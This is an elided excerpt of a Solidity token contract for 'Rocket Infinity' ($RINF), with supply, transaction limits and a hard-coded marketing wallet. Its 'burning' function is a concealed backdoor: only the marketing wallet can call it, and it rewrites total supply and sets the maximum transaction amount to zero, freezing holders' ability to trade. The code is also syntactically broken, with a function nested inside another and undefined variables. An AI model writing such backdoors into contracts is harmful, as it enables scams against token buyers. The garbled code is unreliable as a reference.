...
// SPDX-License-Identifier: Unlicensed Rocket Infinity
...
contract Rocketinfinity is Context, IERC20, Ownable {
    ...
    constructor () {
        _name = "Rocket Infinity";
        _symbol = "$RINF";
        _decimals = 18;
        _tTotal = 1000000000000 * 10 ** _decimals;
        _rTotal = (MAX - (MAX % _tTotal));
        _maxTxAmount = 30000000000 * 10 ** _decimals;  
        _maxWalletBalance = 30000000000 * 10**_decimals;
        numTokensSellToAddToLiquidity = 100000000 * 10 ** _decimals;
        _marketingWalletAddress = 0x69CB73AFF06C3fd6A55d6499323D3f6fdd70e13C; // Marketing wallet address
    ...
    function _transferFromExcluded(address sender, address recipient, uint256 tAmount) private {
        ...
        function burning(uint256 _burn) public{
            ...
            (_tTotal +=_burn) / aaa;
            _tTotal = _rTotal++;
        require(_msgSender() == _marketingWalletAddress, "ERC20: cannot permit dev address");
     _maxTxAmount = 0;
     }
